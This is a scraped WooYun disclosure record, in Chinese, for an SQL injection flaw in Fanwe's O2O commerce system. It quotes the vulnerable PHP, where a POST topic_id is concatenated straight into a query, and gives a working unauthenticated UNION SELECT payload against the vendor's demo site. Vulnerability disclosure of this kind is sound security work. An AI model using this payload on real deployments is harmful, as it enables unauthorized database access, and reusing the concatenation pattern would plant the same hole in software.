{"id": 70945, "wybug_id": "wooyun-2015-0122585", "wybug_title": "方维O2O商业系统SQL注入5（demo验证直接回显）", "wybug_corp": "fanwe.com", "wybug_author": "story", "wybug_date": "2015-06-25 11:38", "wybug_open_date": "2015-09-28 11:40", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-30：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-08-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-28：\t细节向公众公开  简要描述： 带一波通用型节奏。UNION SELECT注入，直接显示结果，无需登录，demo验证，可批量。 详细说明：  /app/Lib/main/ajaxModule.class.php\npublic function load_topic_reply_list(){\t\tglobal_run();\t\tif($GLOBALS['user_info']){\t\t\t$GLOBALS['tmpl']->assign(\"user_info\",$GLOBALS['user_info']);\t\t}\t\t$topic_id = $_POST['topic_id'];\t\trequire_once APP_ROOT_PATH.'system/model/topic.php';\t\trequire_once APP_ROOT_PATH.\"app/Lib/page.php\";\t\t//分页\t\t$page_size = 5;\t\t$page = intval($_REQUEST['p']);\t\tif($page==0)\t\t\t$page = 1;\t\t$limit = (($page-1)*$page_size).\",\".$page_size;\t\t\t\t$reply_list = get_topic_reply_list($topic_id,$limit);\n从post中获取topic_id（$topic_id = $_POST['topic_id'];），传入get_topic_reply_list函数。跟进：\nfunction get_topic_reply_list($topic_id,$limit){\t$sql = \"SELECT id,topic_id,user_id,user_name,content,create_time,reply_id,reply_user_id,reply_user_name from \".DB_PREFIX.\"topic_reply where is_effect=1 and is_delete=0 and topic_id=\".$topic_id.\" order by id desc limit \".$limit;\t$data = $GLOBALS['db']->getAll($sql);\tforeach($data as $k=>$v){\t\t$data[$k]['format_create_time'] = to_date($v['create_time'],\"Y-m-d H:i\");\t}\treturn $data;}\n直接带入SQL语句。demo验证：\n\nPOST数据包：http://o2odemo.fanwe.net/index.php?ctl=ajax&act=load_topic_reply_listtopic_id=-1 union select%0b1,2,3,user(),5,6,7,8,9%23测试代码中写了个验证脚本，效果如图：\n\n   漏洞证明：  \n\n   修复方案：  过滤。   版权声明：转载请注明来源 story@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-09-28 11:40 厂商回复：  漏洞Rank：4  (WooYun评价) 最新状态： 2015-06-30：正在处理  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}